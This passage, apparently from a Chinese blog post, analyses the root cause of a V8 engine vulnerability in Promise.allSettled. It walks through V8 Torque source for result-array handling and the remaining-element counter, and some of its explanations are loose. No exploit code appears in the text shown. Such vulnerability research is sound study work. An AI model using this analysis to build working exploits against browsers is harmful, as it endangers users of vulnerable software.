<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title class_">Promise</span>.<span class="property">allSettled</span>) &#123;</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="property">allSettled</span> = <span class="function"><span class="params">promises</span> =&gt;</span></span><br><span class="line">    <span class="title class_">Promise</span>.<span class="title function_">all</span>(</span><br><span class="line">      promises.<span class="title function_">map</span>(<span class="function"><span class="params">p</span> =&gt;</span> </span><br><span class="line">        p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> (&#123; <span class="attr">status</span>: <span class="string">&quot;fulfilled&quot;</span>, value &#125;),</span><br><span class="line">          <span class="function"><span class="params">reason</span> =&gt;</span> (&#123; <span class="attr">status</span>: <span class="string">&quot;rejected&quot;</span>, reason &#125;)</span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>总结</strong></p>
<p>当您需要：</p>
<ul>
<li>获取多个异步操作的完整结果报告</li>
<li>独立处理每个 Promise 的结果（无论成功失败）</li>
<li>避免因单个失败导致整个操作中断</li>
</ul>
<p><code>Promise.allSettled()</code> 是最佳选择，它提供了对异步操作结果的完整可见性和控制权</p>
<h2 id="四、漏洞成因"><a href="#四、漏洞成因" class="headerlink" title="四、漏洞成因"></a>四、漏洞成因</h2><p>前面讲了promise.allSettled。重点是，只有传入的所有promise对象都已经fulfilled或rejected后才会返回一个array。</p>
<h3 id="漏洞代码解释"><a href="#漏洞代码解释" class="headerlink" title="漏洞代码解释"></a>漏洞代码解释</h3><h4 id="PromiseAllSettled"><a href="#PromiseAllSettled" class="headerlink" title="PromiseAllSettled"></a>PromiseAllSettled</h4><p>我们来看下PromiseAllSettled的对应实现，源码在src&#x2F;builtins&#x2F;promise-all.tq。<code>PromiseAllSettled</code>仅仅是调用了<code>GeneratePromiseAll</code>, 然后再调用至<code>PerformPromiseAll</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES#sec-promise.allsettled</span></span><br><span class="line"><span class="comment">// Promise.allSettled ( iterable )</span></span><br><span class="line">transitioning javascript builtin <span class="title class_">PromiseAllSettled</span>(</span><br><span class="line">    js-implicit <span class="attr">context</span>: <span class="title class_">Context</span>, <span class="attr">receiver</span>: <span class="title class_">JSAny</span>)(<span class="attr">iterable</span>: <span class="title class_">JSAny</span>): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">GeneratePromiseAll</span>(</span><br><span class="line">      receiver, iterable, <span class="title class_">PromiseAllSettledResolveElementFunctor</span>&#123;&#125;,</span><br><span class="line">      <span class="title class_">PromiseAllSettledRejectElementFunctor</span>&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这段代码是 V8 引擎中实现 JavaScript <code>Promise.allSettled()</code> 方法的核心逻辑。我来逐行解释它的工作原理：</p>
<p><strong>1. 函数定义与参数</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">transitioning javascript builtin <span class="title class_">PromiseAllSettled</span>(</span><br><span class="line">    js-implicit <span class="attr">context</span>: <span class="title class_">Context</span>, <span class="attr">receiver</span>: <span class="title class_">JSAny</span>)(<span class="attr">iterable</span>: <span class="title class_">JSAny</span>): <span class="title class_">JSAny</span> &#123;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>transitioning</code>：标记这是从 JavaScript 到 C++ 的过渡函数（V8 内部实现方式）。</li>
<li><code>javascript builtin</code>：表示这是 JavaScript 的内置函数。</li>
<li><code>PromiseAllSettled</code>：实现 <code>Promise.allSettled()</code> 方法。</li>
<li>参数<ul>
<li><code>context</code>：执行上下文（隐式参数）。</li>
<li><code>receiver</code>：调用该方法的对象（通常是 <code>Promise</code> 构造函数）。</li>
<li><code>iterable</code>：传入的可迭代对象（如数组），包含多个 Promise。</li>
</ul>
</li>
</ul>
<p><strong>2. 核心逻辑：调用 <code>GeneratePromiseAll</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> <span class="title class_">GeneratePromiseAll</span>(</span><br><span class="line">      receiver, iterable, <span class="title class_">PromiseAllSettledResolveElementFunctor</span>&#123;&#125;,</span><br><span class="line">      <span class="title class_">PromiseAllSettledRejectElementFunctor</span>&#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>GeneratePromiseAll</code>：V8 内部的通用函数，用于处理 Promise 聚合逻辑（如 <code>Promise.all</code> 和 <code>Promise.allSettled</code>）。</li>
<li>关键区别<ul>
<li><code>Promise.allSettledResolveElementFunctor</code>：处理 Promise 成功的情况。</li>
<li><code>Promise.allSettledRejectElementFunctor</code>：处理 Promise 失败的情况。</li>
</ul>
</li>
<li>这两个 Functor 定义了 <code>Promise.allSettled</code> 的核心行为：<strong>无论 Promise 是成功还是失败，都继续执行，最终返回包含所有结果的数组</strong>。</li>
</ul>
<p><strong>总结：<code>Promise.allSettled()</code> 的核心逻辑</strong></p>
<ol>
<li><strong>与 <code>Promise.all</code> 的区别</strong>：<ul>
<li><code>Promise.all</code>：只要有一个 Promise 失败，就立即返回失败。</li>
<li><code>Promise.allSettled</code>：等待所有 Promise <strong>无论成功或失败</strong>，并返回包含结果状态的数组（如 <code>&#123;status: &quot;fulfilled&quot;, value: x&#125;</code> 或 <code>&#123;status: &quot;rejected&quot;, reason: y&#125;</code>）。</li>
</ul>
</li>
<li><strong>V8 实现方式</strong>：<ul>
<li>通过 <code>GeneratePromiseAll</code> 通用函数实现。</li>
<li>使用不同的 Functor 处理成功和失败的 Promise，确保所有结果都被收集。</li>
</ul>
</li>
<li><strong>实际应用场景</strong>：<ul>
<li>批量请求资源时，不希望一个失败导致全部中断。</li>
<li>需要统计所有请求的成功 &#x2F; 失败状态。</li>
</ul>
</li>
</ol>
<h4 id="PerformPromiseAll"><a href="#PerformPromiseAll" class="headerlink" title="PerformPromiseAll"></a>PerformPromiseAll</h4><p>我们来看下PerformPromiseAll的对应实现，源码在src&#x2F;builtins&#x2F;promise-all.tq，大致上说，这个函数对传入的参数进行迭代，并对其中的每一个元素都调用了promiseResolve。同时，函数中使用了<code>remainingElementsCount</code>这个变量来代表“尚未处理完成的promise数量”，并将这个值保存在了resolveElementContext中，便于全局访问。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">transitioning macro <span class="title class_">GeneratePromiseAll</span>&lt;<span class="attr">F1</span>: type, <span class="attr">F2</span>: type&gt;(</span><br><span class="line">    implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">    <span class="attr">receiver</span>: <span class="title class_">JSAny</span>, <span class="attr">iterable</span>: <span class="title class_">JSAny</span>, <span class="attr">createResolveElementFunctor</span>: <span class="variable constant_">F1</span>,</span><br><span class="line">    <span class="attr">createRejectElementFunctor</span>: <span class="variable constant_">F2</span>): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> nativeContext = <span class="title class_">LoadNativeContext</span>(context);</span><br><span class="line">  <span class="comment">// Let C be the this value.</span></span><br><span class="line">  <span class="comment">// If Type(C) is not Object, throw a TypeError exception.</span></span><br><span class="line">  <span class="keyword">const</span> receiver = <span class="title class_">Cast</span>&lt;<span class="title class_">JSReceiver</span>&gt;(receiver)</span><br><span class="line">      otherwise <span class="title class_">ThrowTypeError</span>(<span class="title class_">MessageTemplate</span>::kCalledOnNonObject, <span class="string">&#x27;Promise.all&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Let promiseCapability be ? NewPromiseCapability(C).</span></span><br><span class="line">  <span class="comment">// Don&#x27;t fire debugEvent so that forwarding the rejection through all does</span></span><br><span class="line">  <span class="comment">// not trigger redundant ExceptionEvents</span></span><br><span class="line">  <span class="keyword">const</span> capability = <span class="title class_">NewPromiseCapability</span>(receiver, <span class="title class_">False</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// NewPromiseCapability guarantees that receiver is Constructor.</span></span><br><span class="line">  <span class="title function_">assert</span>(<span class="title class_">Is</span>&lt;<span class="title class_">Constructor</span>&gt;(receiver));</span><br><span class="line">  <span class="keyword">const</span> constructor = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">Constructor</span>&gt;(receiver);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// Let promiseResolve be GetPromiseResolve(C).</span></span><br><span class="line">    <span class="comment">// IfAbruptRejectPromise(promiseResolve, promiseCapability).</span></span><br><span class="line">    <span class="keyword">const</span> promiseResolveFunction =</span><br><span class="line">        <span class="title class_">GetPromiseResolve</span>(nativeContext, constructor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let iterator be GetIterator(iterable).</span></span><br><span class="line">    <span class="comment">// IfAbruptRejectPromise(iterator, promiseCapability).</span></span><br><span class="line">    <span class="keyword">let</span> i = <span class="attr">iterator</span>::<span class="title class_">GetIterator</span>(iterable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let result be PerformPromiseAll(iteratorRecord, C,</span></span><br><span class="line">    <span class="comment">// promiseCapability). If result is an abrupt completion, then</span></span><br><span class="line">    <span class="comment">//   If iteratorRecord.[[Done]] is false, let result be</span></span><br><span class="line">    <span class="comment">//       IteratorClose(iterator, result).</span></span><br><span class="line">    <span class="comment">//    IfAbruptRejectPromise(result, promiseCapability).</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">PerformPromiseAll</span>(</span><br><span class="line">        nativeContext, i, constructor, capability, promiseResolveFunction,</span><br><span class="line">        createResolveElementFunctor, createRejectElementFunctor)</span><br><span class="line">        otherwise <span class="title class_">Reject</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) deferred &#123;</span><br><span class="line">    goto <span class="title class_">Reject</span>(e);</span><br><span class="line">  &#125; label <span class="title class_">Reject</span>(<span class="attr">e</span>: <span class="title class_">Object</span>) deferred &#123;</span><br><span class="line">    <span class="comment">// Exception must be bound to a JS value.</span></span><br><span class="line">    <span class="keyword">const</span> e = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSAny</span>&gt;(e);</span><br><span class="line">    <span class="keyword">const</span> reject = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSAny</span>&gt;(capability.<span class="property">reject</span>);</span><br><span class="line">    <span class="title class_">Call</span>(context, reject, <span class="title class_">Undefined</span>, e);</span><br><span class="line">    <span class="keyword">return</span> capability.<span class="property">promise</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>1. 函数定义与泛型参数</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">transitioning macro <span class="title class_">GeneratePromiseAll</span>&lt;<span class="attr">F1</span>: type, <span class="attr">F2</span>: type&gt;(</span><br><span class="line">    implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">    <span class="attr">receiver</span>: <span class="title class_">JSAny</span>, <span class="attr">iterable</span>: <span class="title class_">JSAny</span>, <span class="attr">createResolveElementFunctor</span>: <span class="variable constant_">F1</span>,</span><br><span class="line">    <span class="attr">createRejectElementFunctor</span>: <span class="variable constant_">F2</span>): <span class="title class_">JSAny</span> &#123;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>transitioning macro</code>：从 JavaScript 到 C++ 的过渡宏。</li>
<li>泛型参数F1和F2：分别是处理 Promise 成功和失败的函数类型。<ul>
<li>对 <code>Promise.all</code>：<code>F1</code> 和 <code>F2</code> 会触发不同行为（失败立即拒绝）。</li>
<li>对 <code>Promise.allSettled</code>：<code>F1</code> 和 <code>F2</code> 都会收集结果（无论成功或失败）。</li>
</ul>
</li>
<li>参数<ul>
<li><code>receiver</code>：调用该方法的对象（通常是 <code>Promise</code> 构造函数）。</li>
<li><code>iterable</code>：传入的可迭代对象（如数组），包含多个 Promise。</li>
<li><code>createResolveElementFunctor</code> 和 <code>createRejectElementFunctor</code>：自定义处理逻辑的函数。</li>
</ul>
</li>
</ul>
<p><strong>2. 创建新的 Promise 能力（PromiseCapability）</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> capability = <span class="title class_">NewPromiseCapability</span>(receiver, <span class="title class_">False</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>NewPromiseCapability</code>：创建一个新的 Promise 和对应的 <code>resolve</code>&#x2F;<code>reject</code> 函数。</li>
<li><code>False</code>：禁用调试事件，避免重复触发异常事件。</li>
</ul>
<p><strong>3. 获取 Promise 的 <code>resolve</code> 函数</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promiseResolveFunction = <span class="title class_">GetPromiseResolve</span>(nativeContext, constructor);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>GetPromiseResolve</code>：获取 Promise 的 <code>resolve</code> 方法，用于将值包装为 Promise。</li>
</ul>
<p><strong>4. 遍历可迭代对象并执行 Promise 聚合</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="attr">iterator</span>::<span class="title class_">GetIterator</span>(iterable);</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">PerformPromiseAll</span>(</span><br><span class="line">    nativeContext, i, constructor, capability, promiseResolveFunction,</span><br><span class="line">    createResolveElementFunctor, createRejectElementFunctor)</span><br><span class="line">    otherwise <span class="title class_">Reject</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>iterator::GetIterator</code>：获取可迭代对象的迭代器。</p>
</li>
<li><pre><code>PerformPromiseAll
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ：核心逻辑，处理所有 Promise 并返回结果：</span><br><span class="line"></span><br><span class="line">  - 遍历每个 Promise，对其调用 `then` 方法。</span><br><span class="line">  - 根据 `createResolveElementFunctor` 和 `createRejectElementFunctor` 的逻辑处理结果。</span><br><span class="line">  - 最终通过 `capability.resolve` 返回一个新 Promise。</span><br><span class="line"></span><br><span class="line">**5. 异常处理**</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">try &#123;</span><br><span class="line">  // 正常逻辑...</span><br><span class="line">&#125; catch (e) deferred &#123;</span><br><span class="line">  goto Reject(e);</span><br><span class="line">&#125; label Reject(e: Object) deferred &#123;</span><br><span class="line">  const e = UnsafeCast&lt;JSAny&gt;(e);</span><br><span class="line">  const reject = UnsafeCast&lt;JSAny&gt;(capability.reject);</span><br><span class="line">  Call(context, reject, Undefined, e);</span><br><span class="line">  return capability.promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>如果执行过程中抛出异常，跳转到 <code>Reject</code> 标签。</p>
</li>
<li><p><code>Reject</code> 标签：调用 <code>capability.reject</code> 拒绝 Promise，并返回被拒绝的 Promise。</p>
</li>
</ul>
<h4 id="PromiseAllResolveElementClosure"><a href="#PromiseAllResolveElementClosure" class="headerlink" title="PromiseAllResolveElementClosure"></a>PromiseAllResolveElementClosure</h4><p>我们来看下PromiseAllResolveElementClosure的对应实现，源码在src&#x2F;builtins&#x2F;promise-all-element-closure.tq中。当promise被resolve时，就会调用<code>resolveElementFun</code>；相应的，promise被reject时，就会调用 <code>rejectElementFun</code> 。这两个函数分别由<code>createResolveElementFunctor</code> 和 <code>createRejectElementFunctor</code>生成，并且它们最终都会调用至<code>PromiseAllResolveElementClosure</code>。在这里，V8会将promise处理的结果保存至一个数组中，同时减少“尚未处理完成的promise数量”的值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">transitioning macro <span class="title class_">PromiseAllResolveElementClosure</span>&lt;<span class="attr">F</span>: type&gt;(</span><br><span class="line">    implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">    <span class="attr">value</span>: <span class="title class_">JSAny</span>, <span class="attr">function</span>: <span class="title class_">JSFunction</span>, <span class="attr">wrapResultFunctor</span>: F): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">  <span class="comment">// We use the &#123;function&#125;s context as the marker to remember whether this</span></span><br><span class="line">  <span class="comment">// resolve element closure was already called. It points to the resolve</span></span><br><span class="line">  <span class="comment">// element context (which is a FunctionContext) until it was called the</span></span><br><span class="line">  <span class="comment">// first time, in which case we make it point to the native context here</span></span><br><span class="line">  <span class="comment">// to mark this resolve element closure as done.</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">IsNativeContext</span>(context)) deferred &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="title function_">assert</span>(</span><br><span class="line">      context.<span class="property">length</span> ==</span><br><span class="line">      <span class="title class_">PromiseAllResolveElementContextSlots</span>::kPromiseAllResolveElementLength);</span><br><span class="line">  <span class="keyword">const</span> nativeContext = <span class="title class_">LoadNativeContext</span>(context);</span><br><span class="line">  <span class="keyword">function</span>.<span class="property">context</span> = nativeContext;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update the value depending on whether Promise.all or</span></span><br><span class="line">  <span class="comment">// Promise.allSettled is called.</span></span><br><span class="line">  <span class="keyword">const</span> updatedValue = wrapResultFunctor.<span class="title class_">Call</span>(nativeContext, value);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine the index from the &#123;function&#125;.</span></span><br><span class="line">  <span class="title function_">assert</span>(kPropertyArrayNoHashSentinel == <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> identityHash =</span><br><span class="line">      <span class="title class_">LoadJSReceiverIdentityHash</span>(<span class="keyword">function</span>) otherwise unreachable;</span><br><span class="line">  <span class="title function_">assert</span>(identityHash &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> index = identityHash - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if we need to grow the [[ValuesArray]] to store &#123;value&#125; at &#123;index&#125;.</span></span><br><span class="line">  <span class="keyword">const</span> valuesArray = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSArray</span>&gt;(</span><br><span class="line">      context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                  kPromiseAllResolveElementValuesArraySlot]);</span><br><span class="line">  <span class="keyword">const</span> elements = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">FixedArray</span>&gt;(valuesArray.<span class="property">elements</span>);</span><br><span class="line">  <span class="keyword">const</span> valuesLength = <span class="title class_">Convert</span>&lt;intptr&gt;(valuesArray.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">if</span> (index &lt; valuesLength) &#123;</span><br><span class="line">    <span class="comment">// The &#123;index&#125; is in bounds of the &#123;values_array&#125;,</span></span><br><span class="line">    <span class="comment">// just store the &#123;value&#125; and continue.</span></span><br><span class="line">    elements.<span class="property">objects</span>[index] = updatedValue;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Check if we need to grow the backing store.</span></span><br><span class="line">    <span class="keyword">const</span> newLength = index + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> elementsLength = elements.<span class="property">length_intptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; elementsLength) &#123;</span><br><span class="line">      <span class="comment">// The &#123;index&#125; is within bounds of the &#123;elements&#125; backing store, so</span></span><br><span class="line">      <span class="comment">// just store the &#123;value&#125; and update the &quot;length&quot; of the &#123;values_array&#125;.</span></span><br><span class="line">      valuesArray.<span class="property">length</span> = <span class="title class_">Convert</span>&lt;<span class="title class_">Smi</span>&gt;(newLength);</span><br><span class="line">      elements.<span class="property">objects</span>[index] = updatedValue;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      deferred &#123;</span><br><span class="line">        <span class="comment">// We need to grow the backing store to fit the &#123;index&#125; as well.</span></span><br><span class="line">        <span class="keyword">const</span> newElementsLength = <span class="title class_">IntPtrMin</span>(</span><br><span class="line">            <span class="title class_">CalculateNewElementsCapacity</span>(newLength),</span><br><span class="line">            kPropertyArrayHashFieldMax + <span class="number">1</span>);</span><br><span class="line">        <span class="title function_">assert</span>(index &lt; newElementsLength);</span><br><span class="line">        <span class="title function_">assert</span>(elementsLength &lt; newElementsLength);</span><br><span class="line">        <span class="keyword">const</span> newElements =</span><br><span class="line">            <span class="title class_">ExtractFixedArray</span>(elements, <span class="number">0</span>, elementsLength, newElementsLength);</span><br><span class="line">        newElements.<span class="property">objects</span>[index] = updatedValue;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update backing store and &quot;length&quot; on &#123;values_array&#125;.</span></span><br><span class="line">        valuesArray.<span class="property">elements</span> = newElements;</span><br><span class="line">        valuesArray.<span class="property">length</span> = <span class="title class_">Convert</span>&lt;<span class="title class_">Smi</span>&gt;(newLength);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> remainingElementsCount =</span><br><span class="line">      <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">Smi</span>&gt;(context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                                  kPromiseAllResolveElementRemainingSlot]);</span><br><span class="line">  remainingElementsCount = remainingElementsCount - <span class="number">1</span>;</span><br><span class="line">  context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">              kPromiseAllResolveElementRemainingSlot] = remainingElementsCount;</span><br><span class="line">  <span class="keyword">if</span> (remainingElementsCount == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> capability = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">PromiseCapability</span>&gt;(</span><br><span class="line">        context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                    kPromiseAllResolveElementCapabilitySlot]);</span><br><span class="line">    <span class="keyword">const</span> resolve = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSAny</span>&gt;(capability.<span class="property">resolve</span>);</span><br><span class="line">    <span class="title class_">Call</span>(context, resolve, <span class="title class_">Undefined</span>, valuesArray);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1. 函数定义与参数</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">transitioning macro <span class="title class_">PromiseAllResolveElementClosure</span>&lt;<span class="attr">F</span>: type&gt;(</span><br><span class="line">    implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">    <span class="attr">value</span>: <span class="title class_">JSAny</span>, <span class="attr">function</span>: <span class="title class_">JSFunction</span>, <span class="attr">wrapResultFunctor</span>: F): <span class="title class_">JSAny</span> &#123;</span><br></pre></td></tr></table></figure>

<ul>
<li>**泛型参数 <code>F</code>**：处理结果的函数类型（如 <code>Promise.all</code> 和 <code>Promise.allSettled</code> 的差异点）。</li>
<li>参数<ul>
<li><code>value</code>：当前 Promise 解析的值。</li>
<li><code>function</code>：解析回调函数（携带索引信息）。</li>
<li><code>wrapResultFunctor</code>：封装结果的函数（由调用方提供）。</li>
</ul>
</li>
</ul>
<p><strong>2. 防止重复调用的标记机制</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title class_">IsNativeContext</span>(context)) deferred &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>标记逻辑：通过修改function.context来标记回调是否已执行（避免 Promise 重复解析）。<ul>
<li>首次执行时，<code>context</code> 是普通上下文，继续执行。</li>
<li>重复执行时，<code>context</code> 被设为 <code>NativeContext</code>，直接返回 <code>Undefined</code>。</li>
</ul>
</li>
</ul>
<p><strong>3. 更新结果值</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> updatedValue = wrapResultFunctor.<span class="title class_">Call</span>(nativeContext, value);</span><br></pre></td></tr></table></figure>

<ul>
<li>差异点<ul>
<li><code>Promise.all</code>：直接返回 <code>value</code>。</li>
<li><code>Promise.allSettled</code>：返回 <code>&#123;status: &quot;fulfilled&quot;, value&#125;</code>。</li>
</ul>
</li>
</ul>
<p><strong>4. 从函数中提取索引</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> identityHash = <span class="title class_">LoadJSReceiverIdentityHash</span>(<span class="keyword">function</span>) otherwise unreachable;</span><br><span class="line"><span class="keyword">const</span> index = identityHash - <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>索引存储技巧<ul>
<li>V8 将每个 Promise 的索引编码在其回调函数的 <code>identityHash</code> 中。</li>
